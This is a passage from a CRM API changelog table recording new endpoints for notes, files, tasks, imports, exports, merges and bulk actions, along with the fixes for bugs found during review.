| 2026-08-13 | Added `/crm/notes` (E13). Permissions inherit the parent record; `body` is sanitised server-side before storage. | E13 |
| 2026-08-13 | Added `/crm/files` (E14). Private objects, 5-minute signed downloads, type decided by content sniffing. Q7 resolved: same S3 bucket as the rest of the app, with a local-disk fallback for dev. | E14 |
| 2026-08-13 | Added `/crm/tasks` and `/crm/task-types` (E15). Due buckets resolve in the account's timezone — a new `crm_settings.timezone` field, defaulting to `Asia/Kolkata`. `due_bucket` and `is_overdue` are computed server-side and must not be re-derived client-side. `unwrap()` gains an `extras` option so `bucket_counts` survives. | E15 |
| 2026-08-15 | Added `/crm/imports` (E16) — **companies and deals only**. Encoding and delimiter are detected, not assumed; mapping is positional; the error report is a CSV keyed by the source file's row numbers. Contact import stays blocked on CRM-P2-000, whose scope was corrected from "an index change" to "a shared-row → per-tenant-row data-model change". | E16 |
| 2026-08-15 | Added `/crm/exports` and the two `/export` entry points (E17). Cells are escaped against CSV formula injection, reversibly, and the import worker un-escapes them. `dedupe_key: "company_id"` now actually matches — it was accepted and silently created everything, which would have made the documented export→edit→re-import round trip double every record. | E17 |
| 2026-08-15 | E18: `/crm/companies/duplicates` gains confidence tiers and symmetric pair payloads; `/merge` and `/{id}/unmerge` land. Name matching moved to an indexed `name_normalised` — the old substring query could not match pairs whose normalised forms are equal but whose raw names do not contain each other. Merges are reversible for 30 days. | E18 |
| 2026-08-15 | Auto-linking (E19) and a narrow `PATCH /crm/settings` for its toggle. The built-in free-provider list is a floor the account list adds to, never replaces — the field defaults to empty, and an empty blocklist would produce a single company called Gmail. Q6 resolved: on for new accounts, off for existing, via a one-time migration. | E19 |
| 2026-08-15 | Bulk actions (E20): `POST /crm/companies/bulk` and `/crm/deals/bulk`. `BulkActionResult` gains `skipped_no_permission` and `skipped_reason` — additive, and the difference between "12 of 40 updated" being a bug report and being an understood outcome. The 1,000-record cap is reported in `message`, never applied silently. `bulk_rules.deal_is_closed` read `str(DealStatus.WON)` as `"dealstatus.won"` and reported every closed deal as open — the third time this codebase has been bitten by `str()` on a str-Enum. | E20 |
| 2026-10-22 | **CRM-P0-003.** The endpoint list is now generated from the routers, not transcribed. The contract had drifted both ways: 27 endpoints existed undocumented (all of contacts, saved views, view preferences, task CRUD, attribute writes, the three `/filter-fields`, the board's stage-deals page) and 5 were documented as "not in Phase 1" while shipping. `scripts/check_crm_contract.py` fails on drift in either direction and belongs in CI. Also corrected: prose quoting a broken `/crm/pipelines/undefined/board` URL read as an endpoint claim. | Review |
| 2026-08-15 | Column layouts (E21): `/crm/view-preferences`, stored per (account, user, object type) rather than on the user document — a user on two accounts would otherwise carry one account's custom columns into the other. The choice set is attributes **∪** derived columns; an attributes-only picker could not have expressed the layout the companies list already shipped with. Unknown columns are refused on write and pruned on read. E17's `SYSTEM_COLUMNS` gained the denormalised counters so a list layout survives into its export. | E21 |
| 2026-10-22 | **CRM-413.** Note import: `entity_type: "note"` with a `body` column plus one of `company_id` / `deal_id` / `contact_id` / `contact_email`. References are resolved account-scoped and an unresolved one is a reported row error naming it — a note attached to nothing is invisible forever. The body goes through the same `sanitise` call `POST /crm/notes` makes, and imported notes are never pinned. Two holes found while wiring it, both pre-existing: the import routes demanded `companies:write` (so a deals-only role could not import deals at all, and no per-entity check could see it, because the dependency refuses first), and the required-column check asked for `name` whatever the type — `name` is not a contact column, so **every** contact import had been refused at the door since CRM-412 while 32 worker tests passed. The route is now tested, not only the worker. | E29 |
